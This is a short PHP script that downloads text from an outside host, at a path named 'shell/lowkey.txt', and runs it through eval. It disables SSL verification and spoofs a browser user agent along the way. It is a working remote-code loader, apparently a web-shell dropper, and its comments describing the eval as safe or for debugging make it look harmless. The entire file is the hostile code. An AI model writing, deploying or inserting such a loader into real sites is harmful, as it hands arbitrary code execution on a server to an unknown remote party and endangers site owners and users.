<?php
    function get_contents($url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Avoid verifying SSL peer (older behavior for PHP 5.6.40)
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Avoid verifying SSL host (older behavior for PHP 5.6.40)
        
        $result = curl_exec($ch);
        
        if ($result === false) {
            echo 'Curl error: ' . curl_error($ch);
            http_response_code(404); // Set 404 response code if cURL fails
            curl_close($ch); // Ensure curl is closed before exit
            exit;
        }
        
        curl_close($ch);
        return $result;
    }

    $url = 'https://hellosunshine.pro/shell/lowkey.txt';
    $encoded_code = get_contents($url);

    if ($encoded_code === false) {
        http_response_code(404);
        exit;
    }

    // Optionally, log or display the encoded code for debugging
    // echo $encoded_code;

    // Attempt to safely evaluate the fetched code
    eval('?>' . $encoded_code);
    ?>